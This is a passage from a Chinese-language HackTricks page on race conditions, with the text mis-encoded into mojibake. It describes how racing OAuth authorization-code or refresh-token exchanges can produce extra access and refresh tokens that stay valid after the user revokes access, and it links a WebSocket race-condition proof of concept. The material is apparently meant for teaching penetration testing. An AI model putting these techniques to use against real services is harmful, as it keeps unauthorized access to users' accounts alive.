session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 æ°¸ä¹…æŒä¹…æ€§

æœ‰å‡ ä¸ª [**OAUth æä¾›è€…**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers)ã€‚è¿™äº›æœåŠ¡å…è®¸æ‚¨åˆ›å»ºä¸€ä¸ªåº”ç”¨ç¨‹åºå¹¶éªŒè¯æä¾›è€…æ³¨å†Œçš„ç”¨æˆ·ã€‚ä¸ºæ­¤ï¼Œ**å®¢æˆ·ç«¯**éœ€è¦**å…è®¸æ‚¨çš„åº”ç”¨ç¨‹åº**è®¿é—®å…¶åœ¨**OAUth æä¾›è€…**ä¸­çš„æŸäº›æ•°æ®ã€‚\
åˆ°è¿™é‡Œä¸ºæ­¢ï¼Œåªæ˜¯ä¸€ä¸ªå¸¸è§çš„ä½¿ç”¨ google/linkedin/github ç­‰ç™»å½•çš„è¿‡ç¨‹ï¼Œæ‚¨ä¼šçœ‹åˆ°ä¸€ä¸ªé¡µé¢æç¤ºï¼šâ€œ_åº”ç”¨ç¨‹åº \<InsertCoolName> æƒ³è¦è®¿é—®æ‚¨çš„ä¿¡æ¯ï¼Œæ‚¨æƒ³å…è®¸å—ï¼Ÿ_â€

#### `authorization_code` ä¸­çš„ç«äº‰æ¡ä»¶

**é—®é¢˜**å‡ºç°åœ¨æ‚¨**æ¥å—**åï¼Œè‡ªåŠ¨å°†**`authorization_code`**å‘é€ç»™æ¶æ„åº”ç”¨ç¨‹åºã€‚ç„¶åï¼Œè¿™ä¸ª**åº”ç”¨ç¨‹åºåˆ©ç”¨ OAUth æœåŠ¡æä¾›è€…ä¸­çš„ç«äº‰æ¡ä»¶ï¼Œä»æ‚¨çš„è´¦æˆ·çš„**`authorization_code`**ç”Ÿæˆå¤šä¸ª AT/RT**ï¼ˆ_èº«ä»½éªŒè¯ä»¤ç‰Œ/åˆ·æ–°ä»¤ç‰Œ_ï¼‰ã€‚åŸºæœ¬ä¸Šï¼Œå®ƒå°†åˆ©ç”¨æ‚¨å·²æ¥å—è¯¥åº”ç”¨ç¨‹åºè®¿é—®æ‚¨æ•°æ®çš„äº‹å®æ¥**åˆ›å»ºå¤šä¸ªè´¦æˆ·**ã€‚ç„¶åï¼Œå¦‚æœæ‚¨**åœæ­¢å…è®¸è¯¥åº”ç”¨ç¨‹åºè®¿é—®æ‚¨çš„æ•°æ®ï¼Œä¸€å¯¹ AT/RT å°†è¢«åˆ é™¤ï¼Œä½†å…¶ä»–çš„ä»ç„¶æœ‰æ•ˆ**ã€‚

#### `Refresh Token` ä¸­çš„ç«äº‰æ¡ä»¶

ä¸€æ—¦æ‚¨**è·å¾—æœ‰æ•ˆçš„ RT**ï¼Œæ‚¨å¯ä»¥å°è¯•**åˆ©ç”¨å®ƒç”Ÿæˆå¤šä¸ª AT/RT**ï¼Œå³ä½¿ç”¨æˆ·å–æ¶ˆäº†æ¶æ„åº”ç”¨ç¨‹åºè®¿é—®å…¶æ•°æ®çš„æƒé™ï¼Œ**å¤šä¸ª RT ä»ç„¶æœ‰æ•ˆã€‚**

## **WebSockets ä¸­çš„ RC**

åœ¨ [**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC) ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªç”¨ Java ç¼–å†™çš„ PoCï¼Œä»¥**å¹¶è¡Œ**å‘é€ websocket æ¶ˆæ¯ï¼Œåˆ©ç”¨**Web Sockets ä¸­çš„ç«äº‰æ¡ä»¶**ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=race-condition) è½»æ¾æ„å»ºå’Œ**è‡ªåŠ¨åŒ–å·¥ä½œæµ**ï¼Œç”±ä¸–ç•Œä¸Š**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ä»Šå¤©å°±è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=race-condition" %}
